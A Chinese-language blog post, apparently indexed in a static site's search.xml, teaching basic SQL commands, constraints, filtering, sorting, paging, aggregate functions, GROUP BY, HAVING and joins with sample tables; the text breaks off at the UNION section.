<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>数据库基础知识</title>
    <link href="/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="sql语句"><a href="#sql语句" class="headerlink" title="sql语句"></a>sql语句</h1><p>1、SQL，指结构化查询语言，全称是 Structured Query Language。用于访问和处理数据库的标准的计算机语言。</p><p>2、SQL 对大小写不敏感：SELECT 与 select 是相同的。</p><p>3、重要的sql命令：</p><p>SELECT - 从数据库中提取数据</p><p>UPDATE - 更新数据库中的数据</p><p>DELETE - 从数据库中删除数据</p><p>INSERT INTO - 向数据库中插入新数据</p><p>CREATE DATABASE - 创建新数据库</p><p>ALTER DATABASE - 修改数据库</p><p>CREATE TABLE - 创建新表</p><p>ALTER TABLE - 变更（改变）数据库表</p><p>DROP TABLE - 删除表</p><p>CREATE INDEX - 创建索引（搜索键）</p><p>DROP INDEX - 删除索引</p><h3 id="二、sql命令"><a href="#二、sql命令" class="headerlink" title="二、sql命令"></a>二、sql命令</h3><p>1、创建数据库</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> &lt;数据库名&gt;;<br>eg:  <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> mytest;<br></code></pre></td></tr></table></figure><p>2、查看所有数据库</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">show databases<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>3、删除数据库</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span> &lt;数据库名&gt;;<br>eg:  <span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span> mytest;<br></code></pre></td></tr></table></figure><p>4、选择数据库</p><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs openscad"><span class="hljs-meta"><span class="hljs-keyword">use</span> &lt;数据库名&gt;</span>；<br>eg:   <span class="hljs-keyword">use</span> mytest；<br></code></pre></td></tr></table></figure><p>5、设置使用的字符集</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> names <span class="hljs-comment">utf8</span><br></code></pre></td></tr></table></figure><p>6、创建数据表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-built_in">table_name</span> (<span class="hljs-built_in">column_name</span> column_type);<br></code></pre></td></tr></table></figure><p>7  INSERT INTO 语句</p><p>INSERT INTO 语句可以有两种编写形式。</p><p>第一种形式无需指定要插入数据的列名，只需提供被插入的值即可：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name<br><span class="hljs-keyword">VALUES</span> (value1,value2,value3,...);<br></code></pre></td></tr></table></figure><p>第二种形式需要指定列名及被插入的值：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name (column1,column2,column3,...)<br><span class="hljs-keyword">VALUES</span> (value1,value2,value3,...);<br></code></pre></td></tr></table></figure><ul><li><p><strong>table_name</strong>：需要插入新记录的表名。</p></li><li><p>**column1, column2, …**：需要插入的字段名。</p></li><li><p>**value1, value2, …**：需要插入的字段值。</p></li><li><p>eg：</p><table><thead><tr><th>id</th><th>name</th><th>url</th><th>alexa</th><th>country</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>1</th><th>Google</th><th><a href="https://www.google.cm/">https://www.google.cm/</a></th><th>1</th><th>USA</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>2</th><th>淘宝</th><th><a href="https://www.taobao.com/">https://www.taobao.com/</a></th><th>13</th><th>CN</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>3</th><th>菜鸟教程</th><th><a href="http://www.runoob.com/">http://www.runoob.com/</a></th><th>4689</th><th>CN</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>4</th><th>微博</th><th><a href="http://weibo.com/">http://weibo.com/</a></th><th>20</th><th>CN</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>5</th><th>Facebook</th><th><a href="https://www.facebook.com/">https://www.facebook.com/</a></th><th>3</th><th>USA</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> Websites (<span class="hljs-type">name</span>, url, alexa, country) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;百度&#x27;</span>,<span class="hljs-string">&#x27;https://www.baidu.com/&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;CN&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul><h4 id="sql约束："><a href="#sql约束：" class="headerlink" title="sql约束："></a>sql约束：</h4><p>（1）NOT NULL - 指示某列不能存储 NULL 值。</p><p>（2）UNIQUE - 保证某列的每行必须有唯一的值。</p><p>（3）PRIMARY KEY - NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。</p><p>（4）FOREIGN KEY - 保证一个表中的数据匹配另一个表中的值的参照完整性。</p><p>（5）CHECK - 保证列中的值符合指定的条件。</p><p>（6）DEFAULT - 规定没有给列赋值时的默认值。</p><p>7、查看当前数据库中的所有表</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br></code></pre></td></tr></table></figure><p>8、查看表结构</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">DESC &lt;表名&gt;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>9、查询数据</p><p>（1）基本查询</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">SELECT</span> * <span class="hljs-selector-tag">FROM</span> &lt;表名&gt;；<br></code></pre></td></tr></table></figure><p>（2）投影查询:指在 SQL 查询中只选择特定的列（字段）</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>,<span class="hljs-built_in">column_name</span><br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span>;<br></code></pre></td></tr></table></figure><p>（3）查询结果返回唯一值</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> <span class="hljs-built_in">column_name</span>,<span class="hljs-built_in">column_name</span><br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span>;<br><span class="hljs-keyword">DISTINCT</span> 是修饰符，表示查询结果中只返回不同的值。它会去除重复的记录。<br></code></pre></td></tr></table></figure><p>（4）条件查询</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> &lt;表名&gt; <span class="hljs-keyword">WHERE</span> &lt;条件表达式&gt;；<br><br><span class="hljs-symbol">eg:</span><br><span class="hljs-keyword">SELECT</span> * <br><span class="hljs-keyword">FROM</span> Employees <br><span class="hljs-keyword">WHERE</span> age &gt; <span class="hljs-number">30</span>;<br></code></pre></td></tr></table></figure><p>（5）排序</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name,column_name<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column_name,column_name <span class="hljs-keyword">ASC</span><span class="hljs-operator">|</span><span class="hljs-keyword">DESC</span>;<br><br><br><span class="hljs-keyword">ASC</span> 表示升序（默认），即从小到大排列。<br><span class="hljs-keyword">DESC</span> 表示降序，即从大到小排列。<br>可以在每个列后面单独指定排序方式，例如：column_name1 <span class="hljs-keyword">ASC</span>, column_name2 <span class="hljs-keyword">DESC</span>。<br>eg:升序排序<br><span class="hljs-keyword">SELECT</span> product_id, product_name <br><span class="hljs-keyword">FROM</span> Products <br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> price <span class="hljs-keyword">ASC</span>;<br></code></pre></td></tr></table></figure><p>假设有一个名为 <code>Products</code> 的表，结构如下：</p><table><thead><tr><th>product_id</th><th>product_name</th><th>price</th><th>category</th></tr></thead><tbody><tr><td>1</td><td>Laptop</td><td>1200</td><td>Electronics</td></tr><tr><td>2</td><td>Phone</td><td>800</td><td>Electronics</td></tr><tr><td>3</td><td>Tablet</td><td>600</td><td>Electronics</td></tr><tr><td>4</td><td>Chair</td><td>150</td><td>Furniture</td></tr></tbody></table><p>对于升序：</p><table><thead><tr><th>product_id</th><th>product_name</th></tr></thead><tbody><tr><td>4</td><td>Chair</td></tr><tr><td>3</td><td>Tablet</td></tr><tr><td>2</td><td>Phone</td></tr><tr><td>1</td><td>Laptop</td></tr></tbody></table><p>（6）分页查询</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>(s)<br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br><span class="hljs-keyword">LIMIT</span> number <span class="hljs-keyword">OFFSET</span> 起始值;<br></code></pre></td></tr></table></figure><p>eg:</p><p>假设有一个名为 <code>Employees</code> 的表，结构如下：</p><table><thead><tr><th>id</th><th>name</th><th>age</th><th align="right">department</th></tr></thead><tbody><tr><td>1</td><td>Alice</td><td>30</td><td align="right">HR</td></tr><tr><td>2</td><td>Bob</td><td>25</td><td align="right">IT</td></tr><tr><td>3</td><td>Charlie</td><td>35</td><td align="right">HR</td></tr><tr><td>4</td><td>David</td><td>28</td><td align="right">IT</td></tr><tr><td>5</td><td>Eva</td><td>22</td><td align="right">HR</td></tr></tbody></table><p>如果你想查询前两名员工，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id, name <br><span class="hljs-keyword">FROM</span> Employees <br>LIMIT <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>如果你想从第三条记录开始，返回两名员工，可以写成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id, name <br><span class="hljs-keyword">FROM</span> Employees <br>LIMIT <span class="hljs-number">2</span> <span class="hljs-keyword">OFFSET</span> <span class="hljs-number">2</span>;<br><span class="hljs-keyword">OFFSET</span> 用于指定查询结果的起始位置。<br>起始值 是一个整数，表示从结果的第几条记录开始返回（从 <span class="hljs-number">0</span> 开始计数）。<br></code></pre></td></tr></table></figure><p>对于前两名员工的查询结果：</p><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>Alice</td></tr><tr><td>2</td><td>Bob</td></tr></tbody></table><p>对于从第三条记录开始的查询结果：</p><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>3</td><td>Charlie</td></tr><tr><td>4</td><td>David</td></tr></tbody></table><p>（7）聚合查询</p><p>1、COUNT()统计一张表的数据量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>)  <span class="hljs-keyword">FROM</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-operator">&lt;</span>条件表达式<span class="hljs-operator">&gt;</span>；<br><span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) 是一个聚合函数，用于计算结果集中的总行数。<span class="hljs-operator">*</span> 表示计算所有行，不管列的内容。<br></code></pre></td></tr></table></figure><p>eg：</p><p>假设有一个名为 <code>Employees</code> 的表，结构如下：</p><table><thead><tr><th>id</th><th>name</th><th>age</th><th>department</th></tr></thead><tbody><tr><td>1</td><td>Alice</td><td>30</td><td>HR</td></tr><tr><td>2</td><td>Bob</td><td>25</td><td>IT</td></tr><tr><td>3</td><td>Charlie</td><td>35</td><td>HR</td></tr><tr><td>4</td><td>David</td><td>28</td><td>IT</td></tr><tr><td>5</td><td>Eva</td><td>22</td><td>HR</td></tr></tbody></table><p>如果你想计算部门为 HR 的员工总数，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <br><span class="hljs-keyword">FROM</span> Employees <br><span class="hljs-keyword">WHERE</span> department <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;HR&#x27;</span>;<br></code></pre></td></tr></table></figure><p>对于这个查询，结果将返回满足条件的行数：</p><table><thead><tr><th>COUNT(*)</th></tr></thead><tbody><tr><td>3</td></tr></tbody></table><p>这表示在 <code>Employees</code> 表中，有 3 位员工属于 HR 部门。</p><p>2、SUM() 计算某一列的合计值，该列必须为数值类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SUM</span>(<span class="hljs-operator">*</span>)  <span class="hljs-keyword">FROM</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-operator">&lt;</span>条件表达式<span class="hljs-operator">&gt;</span>；<br><span class="hljs-built_in">SUM</span>() 是一个聚合函数，用于计算指定列的总和。<br><span class="hljs-operator">&lt;</span>列名<span class="hljs-operator">&gt;</span> 是你想要计算总和的列的名称<br></code></pre></td></tr></table></figure><p>假设有一个名为 <code>Sales</code> 的表，结构如下：</p><table><thead><tr><th>id</th><th>amount</th></tr></thead><tbody><tr><td>1</td><td>100</td></tr><tr><td>2</td><td>150</td></tr><tr><td>3</td><td>200</td></tr><tr><td>4</td><td>50</td></tr><tr><td>5</td><td>300</td></tr></tbody></table><p>如果你想计算所有销售记录的总金额，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SUM</span>(amount) <br><span class="hljs-keyword">FROM</span> Sales;<br></code></pre></td></tr></table></figure><p>如果你只想计算金额大于 100 的销售记录的总金额，可以使用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SUM</span>(amount) <br><span class="hljs-keyword">FROM</span> Sales <br><span class="hljs-keyword">WHERE</span> amount <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span>;<br></code></pre></td></tr></table></figure><p>对于第一个查询，结果将是：</p><table><thead><tr><th>SUM(amount)</th></tr></thead><tbody><tr><td>800</td></tr></tbody></table><p>对于第二个查询，结果将是：</p><table><thead><tr><th>SUM(amount)</th></tr></thead><tbody><tr><td>450</td></tr></tbody></table><p>3、AVG（） 计算某一列的平均值，该列必须为数值类型</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">AVG</span>(*)  <span class="hljs-keyword">FROM</span> &lt;表名&gt; <span class="hljs-keyword">WHERE</span> &lt;条件表达式&gt;；<br><span class="hljs-built_in">AVG</span>() 是一个聚合函数，用于计算指定列的平均值。<br>&lt;列名&gt; 是你想要计算平均值的列的名称。<br></code></pre></td></tr></table></figure><p>eg：</p><p>假设有一个名为 <code>Students</code> 的表，结构如下：</p><table><thead><tr><th>id</th><th>score</th></tr></thead><tbody><tr><td>1</td><td>85</td></tr><tr><td>2</td><td>90</td></tr><tr><td>3</td><td>75</td></tr><tr><td>4</td><td>95</td></tr><tr><td>5</td><td>80</td></tr></tbody></table><p>如果你想计算所有学生的平均分，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">AVG</span>(score) <br><span class="hljs-keyword">FROM</span> Students;<br></code></pre></td></tr></table></figure><p>如果你只想计算分数大于 80 的学生的平均分，可以使用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">AVG</span>(score) <br><span class="hljs-keyword">FROM</span> Students <br><span class="hljs-keyword">WHERE</span> score <span class="hljs-operator">&gt;</span> <span class="hljs-number">80</span>;<br></code></pre></td></tr></table></figure><p>对于第一个查询，结果将是：</p><table><thead><tr><th>AVG(score)</th></tr></thead><tbody><tr><td>85</td></tr></tbody></table><p>对于第二个查询，结果将是：</p><table><thead><tr><th>AVG(score)</th></tr></thead><tbody><tr><td>90</td></tr></tbody></table><p>4、MAX（） 计算某一列的最大值</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MAX</span>(*)  <span class="hljs-keyword">FROM</span> &lt;表名&gt; <span class="hljs-keyword">WHERE</span> &lt;条件表达式&gt;；<br><span class="hljs-built_in">MAX</span>() 是一个聚合函数，用于找出指定列中的最大值。<br>&lt;列名&gt; 是你想要找出最大值的列的名称。<br></code></pre></td></tr></table></figure><p>假设有一个名为 <code>Products</code> 的表，结构如下：</p><table><thead><tr><th>id</th><th>price</th></tr></thead><tbody><tr><td>1</td><td>100</td></tr><tr><td>2</td><td>200</td></tr><tr><td>3</td><td>150</td></tr><tr><td>4</td><td>250</td></tr><tr><td>5</td><td>300</td></tr></tbody></table><p>如果你想找出所有产品的最高价格，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MAX</span>(price) <br><span class="hljs-keyword">FROM</span> Products;<br></code></pre></td></tr></table></figure><p>如果你只想找出价格大于 150 的产品的最高价格，可以使用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MAX</span>(price) <br><span class="hljs-keyword">FROM</span> Products <br><span class="hljs-keyword">WHERE</span> price <span class="hljs-operator">&gt;</span> <span class="hljs-number">150</span>;<br></code></pre></td></tr></table></figure><h3 id="查询结果"><a href="#查询结果" class="headerlink" title="查询结果"></a>查询结果</h3><p>对于第一个查询，结果将是：</p><table><thead><tr><th>MAX(price)</th></tr></thead><tbody><tr><td>300</td></tr></tbody></table><p>对于第二个查询，结果将是：</p><table><thead><tr><th>MAX(price)</th></tr></thead><tbody><tr><td>300</td></tr></tbody></table><p>5、MIN（） 计算某一列的最小值</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">MIN</span>(*)  <span class="hljs-keyword">FROM</span> &lt;表名&gt; <span class="hljs-keyword">WHERE</span> &lt;条件表达式&gt;；<br></code></pre></td></tr></table></figure><p>6、GROUP BY 语句用于结合聚合函数，根据一个或多个列对结果集进行分组</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name, aggregate_function(column_name)<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> column_name operator <span class="hljs-keyword">value</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> column_name;<br><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> column_name: 用于将结果集分组，以便对每个组应用聚合函数<br></code></pre></td></tr></table></figure><p>eg:</p><p>假设有一个名为 <code>Sales</code> 的表，结构如下：</p><table><thead><tr><th>product_id</th><th>sales_amount</th></tr></thead><tbody><tr><td>1</td><td>100</td></tr><tr><td>2</td><td>200</td></tr><tr><td>1</td><td>150</td></tr><tr><td>2</td><td>300</td></tr><tr><td>3</td><td>400</td></tr></tbody></table><p>如果你想计算每个产品的总销售额，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> product_id, <span class="hljs-built_in">SUM</span>(sales_amount)<br><span class="hljs-keyword">FROM</span> Sales<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> product_id;<br></code></pre></td></tr></table></figure><p>如果你想计算销售额大于 150 的产品的总销售额，可以这样写：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> product_id, <span class="hljs-built_in">SUM</span>(sales_amount)<br><span class="hljs-keyword">FROM</span> Sales<br><span class="hljs-keyword">WHERE</span> sales_amount <span class="hljs-operator">&gt;</span> <span class="hljs-number">150</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> product_id;<br></code></pre></td></tr></table></figure><p>对于第一个查询，结果将是：</p><table><thead><tr><th>product_id</th><th>SUM(sales_amount)</th></tr></thead><tbody><tr><td>1</td><td>250</td></tr><tr><td>2</td><td>500</td></tr><tr><td>3</td><td>400</td></tr></tbody></table><p>7、HAVING 子句可以让我们筛选分组后的各组数据。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>, aggregate_function(<span class="hljs-built_in">column_name</span>)<br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br><span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">operator</span> <span class="hljs-keyword">value</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-built_in">column_name</span><br><span class="hljs-keyword">HAVING</span> aggregate_function(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">operator</span> <span class="hljs-keyword">value</span>;<br><span class="hljs-keyword">HAVING</span> 子句用于对聚合后的结果进行过滤。只有满足该条件的分组才会出现在最终结果中。<br>这里的 aggregate_function(<span class="hljs-built_in">column_name</span>) 是你在 <span class="hljs-keyword">SELECT</span> 中使用的聚合函数，<span class="hljs-keyword">operator</span> 是同样的比较运算符，<span class="hljs-keyword">value</span> 是比较的值。<br></code></pre></td></tr></table></figure><p>假设有一个名为 <code>Sales</code> 的表，结构如下：</p><table><thead><tr><th>product_id</th><th>sales_amount</th></tr></thead><tbody><tr><td>1</td><td>100</td></tr><tr><td>2</td><td>200</td></tr><tr><td>1</td><td>150</td></tr><tr><td>2</td><td>300</td></tr><tr><td>3</td><td>400</td></tr></tbody></table><p>如果你想计算每个产品的总销售额，并仅返回总销售额大于 300 的产品，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> product_id, <span class="hljs-built_in">SUM</span>(sales_amount) <span class="hljs-keyword">AS</span> total_sales  <br><span class="hljs-built_in">SUM</span>(sales_amount) 计算每个产品的销售总额。<span class="hljs-keyword">AS</span> total_sales 将这个计算结果的列命名为 total_sales<br><span class="hljs-keyword">FROM</span> Sales<br><span class="hljs-keyword">WHERE</span> sales_amount <span class="hljs-operator">&gt;</span> <span class="hljs-number">100</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> product_id<br><span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">SUM</span>(sales_amount) <span class="hljs-operator">&gt;</span> <span class="hljs-number">300</span>;<br></code></pre></td></tr></table></figure><ol><li><strong>WHERE sales_amount &gt; 100</strong>:<ul><li>过滤掉销售额不大于 100 的记录。</li></ul></li><li><strong>GROUP BY product_id</strong>:<ul><li>按 <code>product_id</code> 进行分组。</li></ul></li><li><strong>SELECT product_id, SUM(sales_amount)</strong>:<ul><li>计算每个产品组的总销售额。</li></ul></li><li><strong>HAVING SUM(sales_amount) &gt; 300</strong>:<ul><li>在聚合结果中，只返回总销售额大于 300 的产品。</li></ul></li></ol><p>对于上述示例，结果可能如下：</p><table><thead><tr><th>product_id</th><th>total_sales</th></tr></thead><tbody><tr><td>2</td><td>500</td></tr><tr><td>3</td><td>400</td></tr></tbody></table><p>（8）多表查询（笛卡尔查询）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SELECT</span> * FROM &lt;表<span class="hljs-number">1</span>&gt; &lt;表<span class="hljs-number">2</span>&gt;；<br></code></pre></td></tr></table></figure><ol><li><strong>使用 JOIN</strong>：</li></ol><p>如果表1和表2之间有关系，比如通过某个键（如 <code>id</code>），你可以使用 <code>JOIN</code> 来查询它们的组合：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sql</span><br><span class="hljs-attribute">SELECT</span> *<br><span class="hljs-attribute">FROM</span> 表<span class="hljs-number">1</span><br><span class="hljs-attribute">JOIN</span> 表<span class="hljs-number">2</span> <span class="hljs-literal">ON</span> 表<span class="hljs-number">1</span>.id = 表<span class="hljs-number">2</span>.foreign_id;<br></code></pre></td></tr></table></figure><p>这里，<code>表1.id</code> 是表1中的主键，<code>表2.foreign_id</code> 是表2中对应的外键。</p><ol><li><strong>使用 UNION</strong>：</li></ol><p>如果你想从两个表中获取相同结构的记录，可以使用 <code>UNION</code>：</p><figure class="highlight 